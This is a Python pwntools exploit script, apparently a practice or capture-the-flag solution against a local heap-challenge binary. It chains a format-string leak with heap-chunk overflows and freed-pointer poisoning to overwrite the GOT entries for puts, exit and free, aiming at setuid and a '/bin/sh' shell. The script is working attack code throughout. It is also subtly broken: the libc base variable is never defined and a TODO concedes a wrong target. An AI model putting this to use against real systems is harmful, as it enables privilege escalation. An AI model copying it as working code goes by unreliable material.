


# malloc one chunk of size 16
from pwn import *


r = process('./babyheap_babyheap_level5_testing1')
#print('')
#print(r.clean())

content = b'a'*(0x20-8) + b'\x21' + b'\x00' * 7 + p64(r.elf.got['puts'])
printf_plt = 0x401190


# malloc 0 for #printf() -> leak
r.sendafter("Choice", '1')
r.sendafter("Size", '35')
#r.send(get_leak)
# leak is at 23rd parameter
r.sendafter("Content", b'%23$llx')
#print('')
#print(r.clean())


# malloc first 1
r.sendafter("Choice", '1')
r.sendafter("Size", '8')
r.sendafter("Content", '0')
#print('')
#print(r.clean())

# malloc second 2
r.sendafter("Choice", '1')
r.sendafter("Size", '8')
r.sendafter("Content", '0')
#print('')
#print(r.clean())

# free second
r.sendafter("Choice", '3')
# 1+1
r.sendafter("Index", '2')
#r.send('2')
#print('')
#print(r.clean())

# free first
r.sendafter("Choice", '3')
# 0 + 1
r.sendafter("Index", '1')
#print('')
#print(r.clean())

# malloc index 1
r.sendafter("Choice", '1')
r.sendafter("Size", '8')
r.sendafter("Content", content)
#r.clean()


# malloc index 2
r.sendafter("Choice", '1')
r.sendafter("Size", '8')
r.sendafter("Content", p64(printf_plt))
#print('')
#print(r.clean())

# malloc index 3
r.sendafter("Choice", '1')
r.sendafter("Size", '8')
r.sendafter("Content", p64(printf_plt))
#r.clean()

#print('')
#print(r.clean())
#r.clean()

r.sendafter("Choice", '4')
r.sendafter("Index", '0')
#print('')
print(r.clean())

#libc_leak = 0
#libc_base_addr = libc_leak - 0x21b97
inp = input("ENTER: ")
# now puts should be overwritten with #printf_got

"""
setuid(0)
"""


# malloc first 4
r.send('1')
r.sendafter("Size", '50')
r.sendafter("Content", '0')
#print('')
#print(r.clean())

# malloc second 5
r.sendafter("Choice", '1')
r.sendafter("Size", '50')
r.sendafter("Content", '0')
#print('')
#print(r.clean())


#free second 5
r.sendafter("Choice", '3')
# 1+1
r.sendafter("Index", '5')
#print('')
#print(r.clean())

# free first 4
r.sendafter("Choice", '3')
# 0 + 1
r.sendafter("Index", '4')
#print('')
#print(r.clean())

# malloc index 4
overwrite_exit_to_setuid = b'a'*(0x40-8) + b'\x41' + b'\x00' * 7 + p64(r.elf.got['exit'])
#overwrite_exit_to_setuid = b'a'*(0x40-8) + p64(0x41) + p64(r.elf.got['exit'])
#overwrite_exit_to_setuid = b'a'*(0x40-8) + p64(0x41) + p64(r.elf.got['exit'])
r.sendafter("Choice", '1') 
r.sendafter("Size", '50') 
# content 
r.sendafter("Content", overwrite_exit_to_setuid) 
#print('')
#print(r.clean())



# malloc index 5
call_setuid = libc_base_addr + 0x0e59d0
r.sendafter("Choice", '1')
r.sendafter("Size", '50')
r.sendafter("Content", p64(call_setuid))
#print('')
#print(r.clean())


# malloc index 6
call_setuid = libc_base_addr + 0x0e59d0
r.sendafter("Choice", '1')
r.sendafter("Size", '50')
r.sendafter("Content", p64(call_setuid))
#print('')
#print(r.clean())

"""
Call system

"""

# size=72
# 0x50-8 + 0x51
















# malloc first 7
r.sendafter("Choice", '1')
r.sendafter("Size", '72')
r.sendafter("Content", '0')
#print('')
#print(r.clean())

# malloc second 8
r.sendafter("Choice", '1')
r.sendafter("Size", '72')
r.sendafter("Content", '0')
#print('')
#print(r.clean())

#free second 8
r.sendafter("Choice", '3')
# 1+1
r.sendafter("Index", '8')
#print('')
#print(r.clean())

# free first 7
r.sendafter("Choice", '3')
# 0 + 1
r.sendafter("Index", '7')
#print('')
#print(r.clean())

#overwrite_exit_to_setuid = b'a'*(0x40-8) + b'\x41' + b'\x00' * 7 + p64(r.elf.got['exit'])
overwrite_free_to_binsh = b'a'*(0x50-8) + p64(0x51) + p64(r.elf.got['free'])
r.sendafter("Choice", '1') 
r.sendafter("Size", '72') 
# content 
r.sendafter("Content", overwrite_free_to_binsh) 
#print('')
#print(r.clean())

# malloc index 7
# TODO: use system isntead of binsh!!!!!!!!!!!!!!!!!!!!!!!!!!!
libc_binsh_addr = libc_base_addr + 0x4f4e0
r.sendafter("Choice", '1')
r.sendafter("Size", '72')
r.sendafter("Content", p64(libc_binsh_addr))
#print('')
#print(r.clean())


# malloc index 8
r.sendafter("Choice", '1')
r.sendafter("Size", '72')
r.sendafter("Content", p64(libc_binsh_addr))
#print('')
#print(r.clean())



# send string /bin/sh to free which should be  bin/sh
r.send('1')
r.send('128')
binsh_string = b'/bin/sh\x00'
r.send(binsh_string)
#print('')
#print(r.clean())